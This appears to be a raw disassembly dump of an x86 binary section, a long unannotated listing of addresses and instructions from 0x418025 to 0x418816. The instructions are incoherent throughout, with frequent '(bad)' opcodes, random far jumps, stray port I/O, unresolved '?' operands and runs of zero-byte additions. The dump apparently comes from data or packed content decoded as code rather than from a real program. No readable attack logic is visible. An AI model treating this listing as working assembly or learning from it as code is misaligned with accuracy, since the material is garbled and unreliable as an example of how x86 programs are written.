  418025:	or     BYTE PTR ss:[ebx-0x79258afe],cl
  41802c:	cli    
  41802d:	dec    edx
  41802e:	sub    bl,bl
  418030:	cs jo  0x418035
  418033:	mov    DWORD PTR [edi*4-0x48cfa223],esp
  41803a:	or     al,BYTE PTR [eax]
  41803c:	pop    esi
  41803d:	xor    ecx,DWORD PTR [eax+ebp*8]
  418040:	jp     0x418051
  418042:	inc    ecx
  418043:	std    
  418044:	ret    
  418045:	push   es
  418046:	stos   BYTE PTR es:[edi],al
  418047:	(bad)  
  418048:	(bad)  
  418049:	jmp    0xfd44:0x2a5010c8
  418050:	add    BYTE PTR [eax],0x0
  418053:	add    BYTE PTR [eax],al
  418055:	add    BYTE PTR [eax+0x3a],cl
  418058:	rcl    BYTE PTR [esi+0x57],0x52
  41805c:	and    DWORD PTR [eax],ecx
  41805e:	addr16 js 0x41809a
  418061:	lea    ebx,[edx]
  418063:	inc    esp
  418064:	dec    ebp
  418065:	mov    cl,BYTE PTR [edx]
  418067:	or     al,0x56
  418069:	call   0x41846c
  41806e:	jmp    0x2f03:0xcd1a64db
  418075:	shl    dl,0xc1
  418078:	add    eax,DWORD PTR [eax]
  41807a:	or     DWORD PTR [ebp-0x4492ae15],edi
  418080:	add    eax,0xfd830c8b
  418085:	dec    DWORD PTR [esp+esi*2+0x3e29ff54]
  41808c:	mov    bl,BYTE PTR [ebp-0x4c]
  41808f:	fistp  DWORD PTR [edx+0x33]
  418092:	ret    
  418093:	enter  0xc083,0x38
  418097:	adc    al,0xfb
  418099:	jne    0x4180bb
  41809b:	mov    esp,0xce89ffc5
  4180a0:	cli    
  4180a1:	jne    0x4180f3
  4180a3:	fcmovne st,st(5)
  4180a5:	add    BYTE PTR [ebx+eax*1-0x5],cl
  4180a9:	jne    0x41808f
  4180ab:	mov    ebx,0x2927e8f7
  4180b0:	(bad)  
  4180b1:	inc    edi
  4180b3:	cmp    eax,0xbc544d88
  4180b8:	jg     0x41803a
  4180ba:	add    BYTE PTR [eax],al
  4180bc:	add    BYTE PTR [eax],al
  4180be:	add    BYTE PTR ds:0xc4570003,bl
  4180c4:	test   eax,0x14c3ff2e
  4180c9:	rol    BYTE PTR [ebp-0x630a278b],0x35
  4180d0:	jo     0x41807c
  4180d2:	(bad)  
  4180d3:	aaa    
  4180d4:	xor    DWORD PTR [ecx],eax
  4180d6:	push   ebx
  4180d7:	out    dx,al
  4180d8:	int3   
  4180d9:	sub    esp,0xd87a9c45
  4180df:	xor    BYTE PTR [edi-0x7fbcb7bf],0x7a
  4180e6:	out    dx,eax
  4180e7:	imul   esi,DWORD PTR [edx],0xef6f72b9
  4180ed:	mov    edi,0xfd045ffb
  4180f2:	lds    esi,FWORD PTR [eax]
  4180f4:	add    eax,0x407569d9
  4180f9:	int    0xfb
  4180fb:	call   0x75abb26d
  418100:	add    DWORD PTR [esi],ebp
  418102:	and    BYTE PTR [ecx+ebp*1+0x78],dh
  418106:	push   es
  418107:	out    dx,al
  418108:	test   al,0x83
  41810a:	call   FWORD PTR [edx-0x5ab489d8]
  418110:	stc    
  418111:	inc    edx
  418112:	jae    0x41818d
  418114:	dec    eax
  418115:	int    0x7
  418117:	lea    edi,[esi]
  418119:	paddw  mm7,QWORD PTR [edx-0x5d]
  41811d:	dec    ebx
  41811e:	xor    DWORD PTR [edx-0x8],0xffffffec
  418122:	push   eax
  418123:	add    BYTE PTR [eax],al
  418125:	add    BYTE PTR [eax],al
  418127:	add    dl,al
  418129:	xchg   ebx,eax
  41812a:	stos   DWORD PTR es:[edi],eax
  41812b:	cld    
  41812c:	bound  ebx,QWORD PTR [ebp+0x2ceed87a]
  418132:	xlat   BYTE PTR ds:[ebx]
  418133:	(bad)  
  418134:	call   FWORD PTR [ebx+eax*2+0x5768ff10]
  41813b:	ds out dx,al
  41813d:	and    eax,0x2af58078
  418142:	add    DWORD PTR [eax],eax
  418144:	add    BYTE PTR [edi],bl
  418146:	clc    
  418147:	dec    esi
  418148:	clc    
  418149:	add    dh,BYTE PTR [ebx+edi*8-0x42bc24d]
  418150:	stos   BYTE PTR es:[edi],al
  418151:	mov    BYTE PTR [edx],ch
  418153:	pop    esp
  418154:	cmc    
  418155:	repnz dec ebp
  418157:	inc    ebp
  418158:	icebp  
  418159:	inc    edx
  41815a:	mov    ebx,0xeab801e6
  41815f:	js     0x418194
  418161:	ds mov esp,0xcf2a45fb
  418167:	add    esi,DWORD PTR [ebp+0x2]
  41816a:	es iret 
  41816c:	jp     0x4180f5
  41816e:	daa    
  41816f:	cmc    
  418170:	stc    
  418171:	inc    ecx
  418172:	call   ecx
  418174:	imul   eax,DWORD PTR [ebx],0xffffffe7
  418177:	pop    eax
  418178:	mov    ch,0xf0
  41817a:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41817c:	and    cl,bl
  41817e:	das    
  41817f:	inc    edx
  418180:	ins    DWORD PTR es:[edi],dx
  418181:	add    bl,BYTE PTR [eax+edi*2+0x4c0381a1]
  418188:	hlt    
  418189:	add    esi,DWORD PTR cs:[ecx+0x0]
  418190:	add    BYTE PTR [eax-0x2b],cl
  418193:	(bad)  
  418195:	outs   dx,BYTE PTR ds:[esi]
  418196:	mov    edi,edx
  418198:	js     0x4181d0
  41819a:	adc    al,BYTE PTR [ecx+0x4]
  41819d:	(bad)  
  41819e:	fimul  WORD PTR [edx]
  4181a0:	and    al,0x8d
  4181a2:	fwait
  4181a3:	mov    esp,0x2b8b7844
  4181a8:	and    BYTE PTR [ecx+0x72cea787],al
  4181ae:	sub    DWORD PTR [edi-0x18a6a5bc],0x158f7503
  4181b8:	sbb    al,0x84
  4181ba:	pop    ecx
  4181bb:	ss jl  0x418167
  4181be:	out    0xda,al
  4181c0:	inc    esp
  4181c1:	data16 sbb bl,cl
  4181c4:	ret    
  4181c5:	cmp    cl,BYTE PTR [eax+eax*1]
  4181c8:	aas    
  4181c9:	repz add al,0x48
  4181cc:	cmc    
  4181cd:	or     edx,0x72
  4181d0:	(bad)  
  4181d1:	cmc    
  4181d2:	inc    ebx
  4181d3:	sbb    BYTE PTR [edx+0x18],dh
  4181d6:	cli    
  4181d7:	inc    ebx
  4181d8:	or     eax,0x4e63b221
  4181dd:	cmp    ecx,DWORD PTR [ecx]
  4181df:	mov    DWORD PTR [esi+eax*1+0x76e9c6a5],ebp
  4181e6:	add    ch,al
  4181e8:	sub    ch,BYTE PTR [edi]
  4181ea:	ds std 
  4181ec:	gs ss mov dh,0x4f
  4181f0:	loopne 0x4181ca
  4181f2:	or     eax,0x2993
  4181f7:	add    BYTE PTR [eax],al
  4181f9:	add    BYTE PTR [esi-0x3a],bl
  4181fc:	and    edi,ecx
  4181fe:	sub    eax,0xce2780ee
  418203:	mov    DWORD PTR [esi],eax
  418205:	ret    0xe102
  418208:	pop    ss
  418209:	jp     0x418277
  41820b:	aas    
  41820c:	je     0x4181db
  41820e:	stos   BYTE PTR es:[edi],al
  41820f:	and    al,0x4e
  418211:	pushf  
  418212:	xor    DWORD PTR [edi],edi
  418214:	test   BYTE PTR [ecx+0x54fce7dd],ch
  41821a:	test   DWORD PTR [ebx+0x4adef943],ecx
  418220:	add    cl,ch
  418222:	jbe    0x41824e
  418224:	mov    WORD PTR [eax],?
  418226:	ss aas 
  418228:	test   BYTE PTR [ecx+0x1e813bd],ch
  41822e:	mov    bh,0x3d
  418230:	std    
  418231:	inc    ebx
  418232:	add    DWORD PTR [edi-0x2d7d32bc],0xce7c9e55
  41823c:	adc    eax,0xd8f17929
  418241:	push   0xffffffbd
  418243:	push   cs
  418244:	inc    ecx
  418245:	add    BYTE PTR [ebx-0x41],ah
  418248:	adc    BYTE PTR [esi+ebx*1],bl
  41824b:	inc    eax
  41824c:	std    
  41824d:	imul   ebx,DWORD PTR [eax+ebp*8],0xbf9b34dc
  418254:	jle    0x4182ba
  418256:	jo     0x418272
  418258:	add    BYTE PTR [ebx+0x15710597],al
  41825e:	add    BYTE PTR [eax],al
  418260:	add    BYTE PTR [eax],al
  418262:	add    BYTE PTR [ecx+eax*2+0x18210205],bl
  418269:	sti    
  41826a:	je     0x4182dc
  41826c:	push   ss
  41826d:	sti    
  41826e:	je     0x4182e0
  418270:	push   ss
  418271:	call   0xfb023747
  418276:	jmp    0x41824d
  418278:	xchg   edx,eax
  418279:	je     0x41829f
  41827b:	je     0x41826b
  41827d:	(bad)  
  41827f:	jnp    0x418240
  418281:	xchg   BYTE PTR [eax+eax*8+0xb],dh
  418285:	sti    
  418286:	ss je  0x4182f9
  418289:	adc    eax,0xe559cc01
  41828e:	push   0x8d0006d4
  418293:	xor    BYTE PTR [ebx],ah
  418295:	adc    eax,ebp
  418297:	test   al,0x48
  418299:	cld    
  41829a:	jmp    DWORD PTR [edi]
  41829c:	les    ebx,FWORD PTR [edx+0x5e]
  41829f:	aaa    
  4182a0:	mov    esp,ecx
  4182a2:	pop    ebp
  4182a3:	fimul  WORD PTR [ebx]
  4182a5:	add    BYTE PTR [esi+0x43],dl
  4182a8:	mov    edi,eax
  4182aa:	lea    eax,[ebx+0xe]
  4182ad:	call   0xfb023c5f
  4182b2:	lea    esi,[ebx+0x19a5e81e]
  4182b8:	sar    dl,0x8d
  4182bb:	xchg   ebx,eax
  4182bc:	cs dec ebp
  4182be:	jmp    DWORD PTR [ecx+0x13]
  4182c1:	adc    al,BYTE PTR [eax+0x75]
  4182c4:	sub    DWORD PTR [esi+0x7d],ecx
  4182ca:	add    BYTE PTR [eax],al
  4182cc:	jno    0x418274
  4182ce:	inc    ecx
  4182cf:	je     0x41834b
  4182d1:	sbb    al,0x41
  4182d3:	adc    esi,DWORD PTR [ecx+0x58]
  4182d6:	sar    edi,0xd3
  4182d9:	adc    eax,DWORD PTR [ebp+0xd]
  4182dc:	jecxz  0x4182fe
  4182de:	int3   
  4182df:	jae    0x41834e
  4182e1:	jb     0x41829b
  4182e3:	or     ebp,eax
  4182e5:	outs   dx,BYTE PTR ds:[esi]
  4182e6:	sbb    ecx,ebp
  4182e8:	jbe    0x418290
  4182ea:	retf   0xf007
  4182ed:	loope  0x4182a6
  4182ef:	add    eax,DWORD PTR [edi-0x17]
  4182f2:	sub    eax,0x599ee43
  4182f7:	push   esi
  4182f8:	(bad)  
  4182f9:	jl     0x4182e0
  4182fb:	pop    es
  4182fc:	cld    
  4182fd:	push   edx
  4182fe:	adc    dh,BYTE PTR [ebp-0x4aedd79b]
  418304:	xor    eax,0x814f8e2a
  418309:	and    al,0x72
  41830b:	(bad)  
  41830c:	lock div BYTE PTR [eax+eiz*1+0x390971ee]
  418314:	mov    ah,0xb3
  418316:	sbb    al,0x29
  418318:	mov    ebp,0x370d4f6f
  41831d:	cmp    bl,al
  41831f:	add    ch,al
  418321:	idiv   BYTE PTR [esi]
  418323:	je     0x418376
  418325:	xor    eax,0x3d92358a
  41832a:	int    0x15
  41832c:	xor    eax,0xc48429
  418331:	add    BYTE PTR [eax],al
  418333:	add    BYTE PTR [eax],al
  418335:	jno    0x418387
  418337:	add    eax,DWORD PTR [ecx-0x8ed6ae]
  41833d:	shr    BYTE PTR [ebp+0xc],1
  418340:	add    al,al
  418342:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418343:	das    
  418344:	dec    edi
  418345:	les    eax,FWORD PTR [edx]
  418347:	idiv   BYTE PTR [ecx-0x4e]
  41834a:	add    eax,0xd0dd2b6a
  41834f:	sbb    dl,BYTE PTR [edx+esi*4]
  418352:	retf   
  418353:	adc    cl,BYTE PTR [ecx]
  418355:	xchg   DWORD PTR [edx-0x70],eax
  418358:	imul   esi,DWORD PTR [ebp+0x2],0x1aa58ee7
  41835f:	add    BYTE PTR ds:0x8cdeb2fe,0x6d
  418366:	test   esp,ecx
  418368:	cmp    esi,DWORD PTR [ebp-0x2b]
  41836b:	mov    ch,0x8c
  41836d:	retf   0xe892
  418370:	add    esi,DWORD PTR [ebp-0x79]
  418373:	scas   eax,DWORD PTR es:[edi]
  418374:	jmp    0x41831b
  418376:	cmp    esp,ebx
  418378:	sbb    esp,DWORD PTR [edi-0x3e]
  41837b:	out    0x8c,al
  41837d:	cmp    eax,DWORD PTR [esi]
  41837f:	ins    BYTE PTR es:[edi],dx
  418380:	inc    esp
  418381:	popa   
  418382:	adc    al,0x2e
  418384:	mov    edx,0x2c0ed27a
  418389:	add    BYTE PTR [ebx],0xe7
  41838c:	mov    dh,BYTE PTR [esi]
  41838e:	cmp    ah,BYTE PTR [edx-0x36]
  418391:	jb     0x41831e
  418393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418394:	aas    
  418395:	and    al,0x39
  418397:	fcomp  QWORD PTR [edi]
  418399:	add    BYTE PTR [eax],al
  41839b:	add    BYTE PTR [eax],al
  41839d:	add    BYTE PTR [edi-0x3e],ah
  4183a0:	out    0x84,al
  4183a2:	cs cmp ah,bh
  4183a5:	mov    WORD PTR [esi],?
  4183a7:	or     dl,BYTE PTR [esi+0x5c36468e]
  4183ad:	pop    ss
  4183ae:	hlt    
  4183af:	lahf   
  4183b0:	fiadd  DWORD PTR [ebx]
  4183b2:	sbb    eax,0x75045bf2
  4183b7:	lods   al,BYTE PTR ds:[esi]
  4183b8:	loop   0x418395
  4183ba:	call   0xa6f4:0x7503ab40
  4183c1:	sub    al,0xb4
  4183c3:	js     0x4183c5
  4183c5:	stc    
  4183c6:	and    edi,DWORD PTR [ecx]
  4183c8:	std    
  4183c9:	pop    ss
  4183ca:	adc    eax,DWORD PTR ds:0x2ab9db58
  4183d0:	mov    dl,0xa5
  4183d2:	jbe    0x4183d6
  4183d4:	test   BYTE PTR [ecx+0x2488e402],ch
  4183da:	mov    ch,0x8b
  4183dc:	push   ebx
  4183dd:	sub    ecx,0x4f1607cc
  4183e3:	and    DWORD PTR [esi-0x7bfd8953],ebx
  4183e9:	test   eax,0xb48907ea
  4183ee:	outs   dx,BYTE PTR ds:[esi]
  4183ef:	iret   
  4183f0:	imul   esp,ebp,0xe1538c2e
  4183f6:	pop    esi
  4183f7:	jnp    0x4183ba
  4183f9:	jmp    0x471a1074
  4183fe:	ret    
  4183ff:	xor    al,ch
  418401:	out    0x0,al
  418403:	add    BYTE PTR [eax],al
  418405:	add    BYTE PTR [eax],al
  418407:	lea    edi,[ecx]
  418409:	std    
  41840a:	arpl   WORD PTR [ecx],si
  41840c:	xlat   BYTE PTR ds:[ebx]
  41840d:	pop    eax
  41840e:	(bad)  
  41840f:	das    
  418410:	inc    esp
  418411:	add    al,0xe9
  418413:	mov    edi,0xe5227252
  418419:	pop    ss
  41841a:	mov    edi,0x5cf889ad
  41841f:	std    
  418420:	loopne 0x418477
  418422:	jo     0x418426
  418424:	in     eax,0xf
  418426:	dec    BYTE PTR [eax+0x76a9121a]
  41842c:	mov    eax,DWORD PTR [ebx-0x1b]
  41842f:	mov    eax,ds:0x9f5f07bd
  418434:	ds inc esp
  418436:	add    eax,0x5e8c3799
  41843b:	jge    0x4183c8
  41843d:	push   es
  41843e:	cmp    dh,al
  418440:	lods   eax,DWORD PTR ds:[esi]
  418441:	and    eax,DWORD PTR [eax]
  418443:	cwde   
  418444:	mov    eax,eax
  418446:	je     0x4183e8
  418448:	ins    BYTE PTR es:[edi],dx
  418449:	std    
  41844a:	dec    edi
  41844b:	and    ebx,DWORD PTR [edx]
  41844d:	sbb    al,0x13
  41844f:	mov    esi,?
  418451:	cmp    BYTE PTR [edx],al
  418453:	dec    ebp
  418454:	add    al,0x0
  418456:	jne    0x418485
  418458:	xor    bl,al
  41845a:	jmp    FWORD PTR [eax+0x2a]
  41845d:	or     eax,0x121849ff
  418462:	inc    eax
  418463:	dec    esp
  418464:	mov    bh,BYTE PTR [edi+0x5a58935b]
  41846a:	pop    ecx
  41846b:	add    BYTE PTR [eax],al
  41846d:	add    BYTE PTR [eax],al
  41846f:	add    BYTE PTR [ebp-0x68fff03c],al
  418475:	dec    ecx
  418476:	std    
  418477:	cmp    cl,bl
  418479:	sbb    esi,DWORD PTR [esi+0x7]
  41847c:	pop    edx
  41847d:	dec    edx
  41847e:	and    DWORD PTR [eax],esp
  418480:	push   ds
  418481:	in     eax,dx
  418482:	mov    ebx,0x1c19b356
  418487:	adc    cl,ah
  418489:	add    esi,DWORD PTR [edx]
  41848b:	rol    BYTE PTR [edi-0x28],0xfa
  41848f:	mov    ss:0xc130419,eax
  418495:	add    al,0x7f
  418497:	es int3 
  418499:	imul   edi,DWORD PTR [ebp-0x17fc2400],0x54
  4184a0:	retf   0xfffe
  4184a3:	mov    bl,BYTE PTR [ecx+ecx*4-0xa]
  4184a7:	je     0x418521
  4184a9:	mov    ebx,DWORD PTR [ecx]
  4184ab:	dec    esp
  4184ac:	retf   0xfd43
  4184af:	imul   esp,esp,0xac2473f8
  4184b5:	dec    ebp
  4184b6:	cld    
  4184b7:	shl    DWORD PTR [esi],cl
  4184b9:	aas    
  4184ba:	and    DWORD PTR [eax],esi
  4184bc:	and    al,0x7e
  4184be:	add    BYTE PTR [eax],al
  4184c0:	jne    0x4184eb
  4184c2:	mov    WORD PTR [esi+0x41],?
  4184c5:	(bad)  
  4184c6:	mov    edx,0xd6290f3f
  4184cb:	xchg   DWORD PTR [ebx-0x3aecc2ff],edi
  4184d1:	push   edi
  4184d2:	sar    edi,0x0
  4184d5:	add    BYTE PTR [eax],al
  4184d7:	add    BYTE PTR [eax],al
  4184d9:	out    dx,eax
  4184da:	adc    al,0xe8
  4184dc:	aaa    
  4184dd:	mul    BYTE PTR [ecx+ebx*1-0x7d]
  4184e1:	cmp    al,0xd
  4184e3:	(bad)  
  4184e4:	test   BYTE PTR gs:0x18cb000c,0xd
  4184ec:	mov    dh,0xb0
  4184ee:	xor    ah,BYTE PTR [ebx-0x5cce3778]
  4184f4:	mov    esi,0x8a32117
  4184f9:	aaa    
  4184fa:	pop    eax
  4184fb:	jbe    0x4184e5
  4184fd:	push   0xffffff98
  4184ff:	add    al,0xe8
  418501:	mov    ebx,DWORD PTR [eax+0x64fd0001]
  418507:	in     eax,0x23
  418509:	out    dx,al
  41850a:	jmp    0x28fc1737
  41850f:	add    DWORD PTR [eax+0x44],edx
  418512:	nop
  418513:	sar    DWORD PTR ds:[edx-0x49],1
  418517:	les    esp,FWORD PTR [ebx]
  418519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41851a:	lods   al,BYTE PTR ds:[esi]
  41851b:	inc    esp
  41851c:	or     al,0x2d
  41851e:	xchg   ebp,eax
  41851f:	adc    ecx,DWORD PTR [eax+0x49]
  418522:	cmp    al,0xa9
  418524:	jg     0x41859b
  418526:	sub    DWORD PTR [ecx],eax
  418528:	push   0x75
  41852a:	jo     0x41856a
  41852c:	adc    esp,DWORD PTR ds:0xf7ffc157
  418532:	fmul   QWORD PTR [ecx+ebp*8]
  418535:	jno    0x4184be
  418537:	mov    WORD PTR [esi+0x37],gs
  41853a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41853b:	mov    esp,0x23
  418540:	add    BYTE PTR [eax],al
  418542:	dec    ebp
  418543:	add    dh,BYTE PTR [edx+0x45]
  418546:	popf   
  418547:	cmp    edi,DWORD PTR [ebp+edi*1-0x17cc7578]
  41854e:	shl    WORD PTR [esp+ebp*4],cl
  418552:	add    eax,0xdd0427a0
  418557:	add    ah,bh
  418559:	or     esi,DWORD PTR [ebp+0x2a]
  41855c:	dec    eax
  41855d:	pop    esi
  41855e:	pusha  
  41855f:	arpl   WORD PTR ss:[ecx+eiz*8-0x3],ax
  418564:	pop    ecx
  418565:	add    ebx,DWORD PTR [edx+0x3]
  418568:	sahf   
  418569:	cmp    eax,0x727ecd48
  41856e:	add    sp,di
  418571:	adc    BYTE PTR [edx+eax*1+0x36333490],0x7e
  418579:	mov    bh,BYTE PTR [ebp+0x223b66c3]
  41857f:	mov    dl,0xd2
  418581:	and    DWORD PTR [edx],0x1
  418584:	fadd   QWORD PTR [esp+eax*2]
  418587:	dec    ebx
  418588:	lds    ecx,FWORD PTR [edx-0x7c20d681]
  41858e:	or     bh,bh
  418590:	rol    DWORD PTR [eax],cl
  418592:	hlt    
  418593:	loopne 0x41857b
  418595:	mov    DWORD PTR ds:0xabc470f2,edi
  41859b:	clc    
  41859c:	push   ds
  41859d:	mov    cl,0x74
  41859f:	mov    BYTE PTR [eax],ch
  4185a1:	or     eax,0x3cb74323
  4185a6:	add    BYTE PTR [eax],al
  4185a8:	add    BYTE PTR [eax],al
  4185aa:	add    BYTE PTR [ecx-0x22],cl
  4185ad:	out    dx,al
  4185ae:	rcl    edx,1
  4185b0:	jb     0x4185ae
  4185b2:	add    dh,BYTE PTR [ebp+0x40]
  4185b5:	jecxz  0x4185ba
  4185b7:	mov    DWORD PTR es:[ebx],edx
  4185ba:	rol    DWORD PTR [ebx+0x5],cl
  4185bd:	lds    esi,FWORD PTR ss:[edx-0x2f]
  4185c1:	jmp    DWORD PTR [edx-0x40]
  4185c4:	in     eax,0x55
  4185c6:	fisub  WORD PTR [ecx]
  4185c8:	mov    cl,0xf
  4185ca:	test   BYTE PTR [ecx],0x3d
  4185cd:	mov    edx,DWORD PTR [ebp+0x7b]
  4185d0:	aaa    
  4185d1:	or     eax,0xad072e86
  4185d6:	fldcw  WORD PTR [ecx+0x6f]
  4185d9:	shl    BYTE PTR [ecx+0x53],cl
  4185dc:	ss or  eax,0x66363377
  4185e2:	out    0xd1,al
  4185e4:	ror    DWORD PTR [ebx],0xde
  4185e7:	loopne 0x418644
  4185e9:	add    DWORD PTR [ebx+0x4e0d4875],ebx
  4185ef:	test   DWORD PTR [edi],eax
  4185f1:	lods   eax,DWORD PTR ds:[esi]
  4185f2:	mov    ds:0xdef7c8ef,al
  4185f7:	rol    DWORD PTR [edx+0x39],0xb7
  4185fb:	cmp    DWORD PTR [edi-0x68],0xd0276e9
  418602:	ds mov dh,0x7d
  418605:	inc    ebx
  418606:	fldln2 
  418608:	(bad)  
  418609:	adc    ebp,DWORD PTR [edx-0x25]
  41860c:	or     BYTE PTR [eax],al
  41860e:	jmp    0xaf00:0x0
  418615:	cmp    DWORD PTR [ebx-0x7],0x76
  418619:	lods   al,BYTE PTR ds:[esi]
  41861a:	and    eax,0x89093362
  41861f:	pushf  
  418620:	jle    0x418625
  418622:	rcr    DWORD PTR [ecx-0x6f17c103],0xa1
  418629:	aaa    
  41862a:	std    
  41862b:	fisub  WORD PTR [eax-0x41]
  41862e:	ds call 0x574e82ef
  418634:	mov    cl,0xe4
  418636:	(bad)  
  418637:	stos   DWORD PTR es:[edi],eax
  418638:	jb     0x4185c5
  41863a:	inc    ebx
  41863b:	fnstsw WORD PTR [ebp+0x2e000fbf]
  418641:	fild   DWORD PTR [esi+0x438a944f]
  418647:	inc    ecx
  418648:	pop    DWORD PTR [ebx-0xb]
  41864b:	cmp    al,0x8d
  41864d:	imul   edx,DWORD PTR [eax],0xffffff8b
  418650:	popa   
  418651:	push   cs
  418652:	inc    edx
  418654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418655:	dec    DWORD PTR [ecx+0x3d0f1413]
  41865b:	inc    ebx
  41865c:	addr16 (bad) 
  41865e:	jno    0x418656
  418660:	inc    edi
  418661:	sub    edi,DWORD PTR [ecx]
  418663:	add    ah,BYTE PTR [ecx+0x3c45870b]
  418669:	std    
  41866a:	mov    esi,0xf8652eb
  41866f:	mov    BYTE PTR [ebp+0x3f],cl
  418672:	inc    eax
  418673:	cmp    esi,DWORD PTR [ebp*2+0xebf3]
  41867a:	add    BYTE PTR [eax],al
  41867c:	add    BYTE PTR [ecx+0x2c],al
  41867f:	add    DWORD PTR [ebp+0x3d],esi
  418682:	test   DWORD PTR [ecx+0x10],eax
  418685:	pop    ds
  418686:	mov    ebp,0xba606e6
  41868b:	mov    BYTE PTR [ecx],dl
  41868d:	dec    ebp
  41868e:	cmp    edi,DWORD PTR [eax]
  418690:	fcomp  DWORD PTR [esi]
  418692:	xacquire xchg BYTE PTR [ebp-0x6c],cl
  418696:	sti    
  418697:	dec    edx
  418698:	or     al,0x85
  41869a:	dec    ecx
  41869b:	cmc    
  41869c:	cmp    ebx,DWORD PTR [edx+0x7]
  41869f:	xchg   BYTE PTR [esi-0x55],ch
  4186a2:	idiv   edx
  4186a4:	pop    esi
  4186a5:	pop    ss
  4186a6:	mov    ecx,0x8852dc0c
  4186ac:	in     al,dx
  4186ad:	dec    edi
  4186ae:	jmp    0xd230:0x5102532f
  4186b5:	scas   eax,DWORD PTR es:[edi]
  4186b6:	clc    
  4186b7:	inc    edx
  4186b8:	xor    ebx,DWORD PTR [ebp+eax*4-0x5d8a17af]
  4186bf:	into   
  4186c0:	out    dx,eax
  4186c1:	in     al,dx
  4186c2:	outs   dx,BYTE PTR ds:[esi]
  4186c3:	pop    ecx
  4186c4:	xchg   DWORD PTR [eax],esi
  4186c6:	add    eax,0x248152fb
  4186cb:	xchg   DWORD PTR [ecx-0x76fed68c],ecx
  4186d1:	sub    BYTE PTR [ecx],ah
  4186d3:	mov    WORD PTR [ebx-0x4f],ss
  4186d6:	mov    dl,0xc7
  4186d8:	jmp    0x4186d8
  4186da:	out    0x13,al
  4186dc:	xchg   DWORD PTR [eax],ebp
  4186de:	push   ecx
  4186df:	dec    cl
  4186e1:	add    BYTE PTR [eax],al
  4186e3:	add    BYTE PTR [eax],al
  4186e5:	add    BYTE PTR [edx-0x2d],ch
  4186e8:	pushf  
  4186e9:	(bad)  
  4186ea:	jb     0x418715
  4186ec:	mov    cs,WORD PTR [ebx+0x59]
  4186ef:	mov    al,0xcf
  4186f1:	imul   edi
  4186f3:	sbb    al,0x14
  4186f5:	mov    BYTE PTR [eax+0x6d4afb64],ch
  4186fb:	sub    al,0x7d
  4186fd:	ds je  0x418729
  418700:	add    DWORD PTR [ebx+0x43428ca5],ecx
  418706:	push   ebp
  418707:	sub    al,BYTE PTR [ecx]
  418709:	add    BYTE PTR [ebp-0x50],dh
  41870c:	xor    BYTE PTR [ecx],bh
  41870e:	mov    al,0x4d
  418710:	mov    eax,0x252dee59
  418715:	xchg   DWORD PTR [eax+0x95b8dad],ebx
  41871b:	mov    al,0xb7
  41871d:	test   DWORD PTR [ebp+0x25],0xa0bb72fe
  418724:	pop    ecx
  418725:	cmp    DWORD PTR [eax-0x1f247c7],ebx
  41872b:	pop    ebp
  41872c:	sub    eax,0xaf007938
  418731:	add    eax,0xfb8303a
  418736:	pop    ecx
  418737:	test   ecx,0x9c01c538
  41873d:	add    edx,esi
  41873f:	mov    ah,0xe
  418741:	mov    WORD PTR [esi],?
  418743:	xor    dl,dl
  418745:	mov    eax,0x8ce9b4ca
  41874a:	add    BYTE PTR [eax],al
  41874c:	add    BYTE PTR [eax],al
  41874e:	add    BYTE PTR [esi],ch
  418750:	xor    ch,BYTE PTR [edx-0x48]
  418753:	retf   0x7d01
  418756:	or     ebx,DWORD PTR [ebp+esi*4-0x2]
  41875a:	mov    dh,0x75
  41875c:	rol    BYTE PTR [ecx],0xff
  41875f:	cmc    
  418760:	pushf  
  418761:	mov    BYTE PTR [esp+edi*8],0xb4
  418765:	test   BYTE PTR [edx],0xfe
  418768:	sub    eax,0xe07fd2d
  41876d:	dec    ebx
  41876e:	imul   edi,esp,0xbe8dcaaf
  418774:	sbb    dl,BYTE PTR [edx]
  418776:	(bad)  
  418777:	push   0xffffffde
  418779:	xchg   esi,eax
  41877a:	ret    
  41877b:	mov    ah,0x7b
  41877d:	adc    al,0x20
  41877f:	cld    
  418780:	xlat   BYTE PTR ds:[ebx]
  418781:	xchg   esi,eax
  418782:	in     eax,dx
  418783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418784:	sub    dh,BYTE PTR [edx-0x29]
  418787:	push   esi
  418788:	ficom  WORD PTR [esi+0x294c0809]
  41878e:	mov    esp,DWORD PTR [esi+0x2768f656]
  418794:	out    dx,al
  418795:	pushf  
  418796:	mov    edx,0x20147d7a
  41879b:	repnz mov edi,0x7d7b2d86
  4187a1:	les    ecx,FWORD PTR [edi-0xe]
  4187a4:	xlat   BYTE PTR ds:[ebx]
  4187a5:	inc    esi
  4187a6:	test   BYTE PTR [esi+0xe],bh
  4187a9:	out    0x86,eax
  4187ab:	test   al,0x4
  4187ad:	aam    0x4
  4187af:	inc    cl
  4187b1:	jmp    0x418842
  4187b6:	add    BYTE PTR [eax],al
  4187b8:	inc    esi
  4187b9:	adc    ch,dh
  4187bb:	push   0xf2001646
  4187c0:	sub    bh,bh
  4187c2:	mov    WORD PTR [edi+0x79],?
  4187c5:	add    al,BYTE PTR [eax]
  4187c7:	or     bl,BYTE PTR es:[edx-0x80]
  4187cb:	pushf  
  4187cc:	push   0x2
  4187ce:	mov    DWORD PTR [edx+esi*2-0x459cfb4b],ebx
  4187d5:	cs mov ch,dh
  4187d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187d9:	(bad)  
  4187da:	mov    DWORD PTR [esi+ebx*2+0x68eddf42],ebp
  4187e1:	cmp    cl,BYTE PTR [eax+0x4b7b85dd]
  4187e7:	leave  
  4187e8:	dec    esp
  4187e9:	dec    ecx
  4187ea:	ror    al,0x82
  4187ed:	jl     0x418840
  4187ef:	(bad)  
  4187f0:	push   0xfeb1013c
  4187f5:	mov    ebp,0x46f1e834
  4187fa:	add    dh,BYTE PTR [eax+0x2b]
  4187fd:	and    eax,0x89a52c87
  418802:	pop    ebx
  418803:	cdq    
  418804:	push   ecx
  418805:	inc    edx
  418806:	jnp    0x418832
  418808:	clc    
  418809:	aam    0xdf
  41880b:	jb     0x418848
  41880d:	cmp    DWORD PTR [ecx],eax
  41880f:	mov    eax,0x62d3d4ef
  418814:	inc    ebx
  418815:	dec    ebp
  418816:	xchg   DWORD PTR [ecx+edx*2],ebx
